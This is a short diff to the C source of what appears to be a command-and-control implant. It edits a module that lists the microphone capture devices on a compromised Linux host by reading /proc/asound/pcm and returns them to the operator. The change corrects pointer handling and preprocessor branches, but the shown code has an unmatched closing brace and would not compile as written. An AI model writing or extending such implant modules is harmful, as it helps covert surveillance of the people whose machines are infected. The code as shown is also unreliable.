@@ -34,22 +34,23 @@ static c2_api_call_t *gather_mic_list(tlv_transport_pkt_t tlv_transport_packet)
     ssize_t read = 0;
 
     FILE *proc_asound_pcm = fopen("/proc/asound/pcm", "r");
+
     if (proc_asound_pcm == NULL)
         return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_FAIL, "");
 
-    c2_api_call_t c2_result = craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");
+    c2_api_call_t *c2_result = craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, "");
 
     while ((read = getline(&sound_device, &len, proc_asound_pcm)) != -1)
     {
         if (strstr(sound_device, "capture") != NULL)
-            c2_result = c2_add_str(c2_result, sound_device);
+            c2_add_str(c2_result, sound_device);
         }
     }
 
     return c2_result;
-    #endif
-
+    #else
     return NULL;
+    #endif
 }
 
 void register_gather_api_calls(c2_api_calls_t **c2_api_calls_table)
